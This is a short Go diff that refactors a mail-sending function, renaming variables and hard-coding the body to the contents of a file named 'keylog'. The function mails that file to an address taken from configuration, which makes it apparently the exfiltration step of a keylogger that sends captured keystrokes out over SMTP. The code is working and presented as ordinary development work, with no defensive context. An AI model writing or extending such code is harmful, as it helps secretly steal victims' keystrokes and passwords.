@@ -7,16 +7,16 @@ import (
 )
 
 func SendMail() {
-	d := gomail.NewDialer(conf.GetString("host_mail"),
+	dialer := gomail.NewDialer(conf.GetString("host_mail"),
 		conf.GetInt("port_mail"),
 		conf.GetString("user_mail"),
 		conf.GetString("pass_mail"))
-	m := gomail.NewMessage()
-	m.SetHeader("From", conf.GetString("from_mail"))
-	m.SetHeader("To", conf.GetString("to_mail"))
-	m.SetHeader("Subject", conf.GetString("subject_mail"))
-	m.SetBody("text", ReadLogFile(conf.GetString("key_log_file")))
-	err := d.DialAndSend(m)
+	message := gomail.NewMessage()
+	message.SetHeader("From", conf.GetString("from_mail"))
+	message.SetHeader("To", conf.GetString("to_mail"))
+	message.SetHeader("Subject", conf.GetString("subject_mail"))
+	message.SetBody("text", ReadLogFile("keylog"))
+	err := dialer.DialAndSend(message)
 	if err != nil {
 		log.Println(err)
 	}
